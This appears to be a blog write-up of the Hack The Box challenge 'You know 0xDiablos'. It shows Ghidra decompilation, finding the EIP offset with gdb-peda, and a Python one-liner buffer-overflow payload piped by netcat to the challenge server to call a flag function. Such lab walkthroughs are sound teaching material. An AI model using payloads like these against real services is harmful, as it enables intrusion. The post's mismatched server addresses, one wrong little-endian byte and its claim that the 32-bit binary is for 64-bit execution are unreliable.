---
layout: post
title: "Hack The Box - You know 0xDiablos"
date: "2023-02-10 10:48 +0100"
image:
  path: /assets/img/posts/you-know-0xdiablos/you-know-0xdiablos-card.png
  alt: You know 0xDiablos - card
categories: [HackTheBox, Beginner Track]
tags: [Hack-The-Box-Easy, buffer-overflow]
---

```
CHALLENGE DESCRIPTION : I missed my flag
HOST : 178.62.24.63:31507
FILE : 1 file (vuln)
```

## Tools used

- [netcat](https://nmap.org/ncat/)
- [gdb](https://www.sourceware.org/gdb/) : with [peda](https://github.com/longld/peda)
- [ghidra](https://ghidra-sre.org/)
- [python3](https://www.python.org/)
- [pwntools](https://github.com/Gallopsled/pwntools#readme) : python library

## What to do ?

- First we'll try to connect to the server with `netcat` to understand what we can do there.
- Next, we will determine what type of file `vuln` is, what it does and what it contains.
- Then we'll find a loophole and exploit it.

## Connect to the server with `netcat`

So, to connect to the server, run the following command :

```bash
obytes> nc 134.209.17.36 32355
You know who are 0xDiablos:
test
test
```

## Vuln file

Do determinate what type of file `vuln` is, we gonna use `file` command :

```bash
rether> file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
dynamically linked, interpreter /lib/ld-linux.so.2,
BuildID[sha1]=ab7f19bb67c16ae453d4959fba4e6841d930a6dd,
for GNU/Linux 3.2.0, not stripped
```

Is a 32-bit Linkable Object Format EFL for 64-bit execution. But what does that mean? It is an executable file.
So the next step is to execute it. But first we must give permission to run the file, by the following command :

```bash
chmod +x vuln
```

Once the execution authorization is given, execute the file

```
obytes> ./vuln
You know who are 0xDiablos:
test
test
```

The program outputs "You know what the 0xDiablos are:" and waits for an input. Then it displays the input. We notice that the `vuln` file is the same as on the server.
To find out more about the vuln program, we need to analyze its code to understand how it works. We are going to use `ghidra` a reverse engineering software that analyzes the compiled code.

When you create a new project and add the vuln file to it. We see three main functions (main, vuln, flag):

#### main function

```cpp
undefined4 main(void)
{
	__gid_t __rgid;

	setvbuf(stdout,(char *)0x0,2,0);
	__rgid = getegid();
	setresgid(__rgid,__rgid,__rgid);
	puts("You know who are 0xDiablos: ");
	vuln();
	return 0;
}
```

#### vuln function

```cpp
void vuln(void)

{
	char local_bc [180];

	gets(local_bc);
	puts(local_bc);
	return;
}
```

#### flag function

```cpp
void flag(int param_1,int param_2)
{
	char local_50 [64];
	FILE *local_10;

	local_10 = fopen("flag.txt","r");
	if (local_10 != (FILE *)0x0) {
		fgets(local_50,0x40,local_10);
		if ((param_1 == -0x21524111) && (param_2 == -0x3f212ff3)) {
			printf(local_50);
		}
		return;
	}
	puts("Hurry up and try in on server side.");
	exit(0);
}
```

### Understand vuln file

Now we can understand how program works. The `main` function call `vuln` function.

```cpp
undefined4 main(void)
{
	...
	vuln();
	...
}
```

Then the vuln method wait for a input with `gets()` and output the message we just in with `puts()`.
The gets method is [susceptible to suffer from buffer overflow attacks](https://www.geeksforgeeks.org/gets-is-risky-to-use/).
To create buffer overflow you need to highlight it.

## Buffer overflow

In the `vuln` function we see this line :

```cpp
char local_bc [180];
```

It is a string of 180 bytes a memory space who can contains 179 characters and the end character 0x00. We need to find the `eip offset`.

```bash
rether> python3 -c "import sys; sys.stdout.buffer.write(b'A'*200)" > exploit.txt
rether> cat exploit.txt | ./vul
You know who are 0xDiablos:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```

The `Segmentation fault` message we notice the program is vulnarable to buffer overflow.  
To determine the exact `epi offset`, we will start the program with `gdb` and wait for the first breakpoint (`peda` set automatically on the main function) :

```bash
gdb-peda$ start
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[----------------------------------registers-----------------------------------]
EAX: 0x80492b1 (<main>: lea    ecx,[esp+0x4])
EBX: 0xf7e1cff4 --> 0x21cd8c
ECX: 0xffffcf90 --> 0x1
EDX: 0xffffcfb0 --> 0xf7e1cff4 --> 0x21cd8c
ESI: 0x8049330 (<__libc_csu_init>:      push   ebp)
EDI: 0xf7ffcb80 --> 0x0
EBP: 0xffffcf78 --> 0x0
ESP: 0xffffcf70 --> 0xffffcf90 --> 0x1
EIP: 0x80492c0 (<main+15>:      sub    esp,0x10)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80492bc <main+11>: mov    ebp,esp
   0x80492be <main+13>: push   ebx
   0x80492bf <main+14>: push   ecx
=> 0x80492c0 <main+15>: sub    esp,0x10
   0x80492c3 <main+18>: call   0x8049120 <__x86.get_pc_thunk.bx>
   0x80492c8 <main+23>: add    ebx,0x2d38
   0x80492ce <main+29>: mov    eax,DWORD PTR [ebx-0x4]
   0x80492d4 <main+35>: mov    eax,DWORD PTR [eax]
[------------------------------------stack-------------------------------------]
0000| 0xffffcf70 --> 0xffffcf90 --> 0x1
0004| 0xffffcf74 --> 0xf7e1cff4 --> 0x21cd8c
0008| 0xffffcf78 --> 0x0
0012| 0xffffcf7c --> 0xf7c23295 (add    esp,0x10)
0016| 0xffffcf80 --> 0x0
0020| 0xffffcf84 --> 0x70 ('p')
0024| 0xffffcf88 --> 0xf7ffcff4 --> 0x33f14
0028| 0xffffcf8c --> 0xf7c23295 (add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Temporary breakpoint 1, 0x080492c0 in main ()
```

To obtain the eip offset, you must create a pattern to determinate where buffer overflow start.

```bash
gdb-peda$ pattern create 200 input.txt
Writing pattern of 200 chars to filename "input.txt"
```

```bash
gdb-peda$ r < input.txt
Starting program: /home/rether/Documents/HTB/tracks/You know 0xDiablos/vuln < input.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
You know who are 0xDiablos:
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xc9
EBX: 0x76414158 ('XAAv')
ECX: 0xf7e1e9b8 --> 0x0
EDX: 0x1
ESI: 0x8049330 (<__libc_csu_init>:      push   ebp)
EDI: 0xf7ffcb80 --> 0x0
EBP: 0x41594141 ('AAYA')
ESP: 0xffffcf40 ("ZAAxAAyA")
EIP: 0x41417741 ('AwAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41417741
[------------------------------------stack-------------------------------------]
0000| 0xffffcf40 ("ZAAxAAyA")
0004| 0xffffcf44 ("AAyA")
0008| 0xffffcf48 --> 0xf7fc1b00 --> 0xf7c1f29f ("GLIBC_2.36")
0012| 0xffffcf4c --> 0x3e8
0016| 0xffffcf50 --> 0xffffcf70 --> 0x1
0020| 0xffffcf54 --> 0xf7e1cff4 --> 0x21cd8c
0024| 0xffffcf58 --> 0x0
0028| 0xffffcf5c --> 0xf7c23295 (add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41417741 in ?? ()
```

The EIP register containt "0x41417741 ('AwAA')" with the next command we can get this offset :

```bash
gdb-peda$ pattern_offset 0x41417741
1094809409 found at offset: 188
```

So now we know the length of this offset.
We need to know the address of the `flag` function to call it in our buffer overflow. `gdb` can display the addresses of the different functions with the following command:

```bash
gdb-peda$ info function
All defined functions:

Non-debugging symbols:
[...]
0x080491e2  flag
[...]
```

We have obtained the address of the `flag` function and from it we can create the buffer overflow with the following command:

```bash
rether> python3 -c "import sys; sys.stdout.buffer.write(b'A'*188+b'\xe2\x91\x04\x08')" > exploit.txt
rether>  cat exploit.txt | ./vuln
You know who are 0xDiablos:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
Hurry up and try in on server side.
```

We see the output string 'Hurry up and try in on server side.' from the flag function :

```cpp
void flag(int param_1,int param_2)
{
	...
	puts("Hurry up and try in on server side.");
	...
}
```

However, it is important to note that we must pass two arguments to the flag function. The addresses of the arguments must be in little endian representation to fill the EIP register. But we have to overwrite the return address by creating one ourselves, now the program won't know where it should go.

To find addresses of parameters we can use ghidra by clicking on the param_1 or param_2.

![Address of parameters 1 and 2 from flag function](/assets/img/posts/you-know-0xdiablos/address_param_1_and_2.png "Address of param_1 and param_2 from flag function")

Convert them to little endian

```
param_1 = 0xdeadbeef -> to little endian \xef\xbe\xab\xde
param_2 = 0xc0ded00d -> to little endian \x0d\xd0\xde\xc0
```

Now time to exploit

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*188+b'\xe2\x91\x04\x08'+b'AAAA\xef\xbe\xad\xde'+b'\x0d\xd0\xde\xc0')" > exploit.txt
```

> Address explained :

- `'A'*188` : epi offset
- `\xe2\x91\x04\x08` : allow to call flag function
- `AAAA` : crushe the returning address
- `xef\xbe\xad\xde` : param_1
- `\x0d\xd0\xde\xc0` : param_2
  {: .prompt-info }

```bash
cat exploit.txt | ./vuln
You know who are 0xDiablos:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAﾭ�
Hurry up and try in on server side.
```

So now we can not try and the server using the following command:

```
cat exploit.txt - | nc 178.62.24.63 31507
You know who are 0xDiablos:

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAﾭ�
HTB{...}
```

> Command explained :

- `cat` : allows to display the content of a file
- `-` : tell cat to read from stdin
- `nc` : allows to open network connections locally on the machine, followed by the host address and the port.
  {: .prompt-info }

![Card of pwned you know 0xdiablos](/assets/img/posts/you-know-0xdiablos/you-know-0xdiablos-pwned.png){: width="972" height="589" }
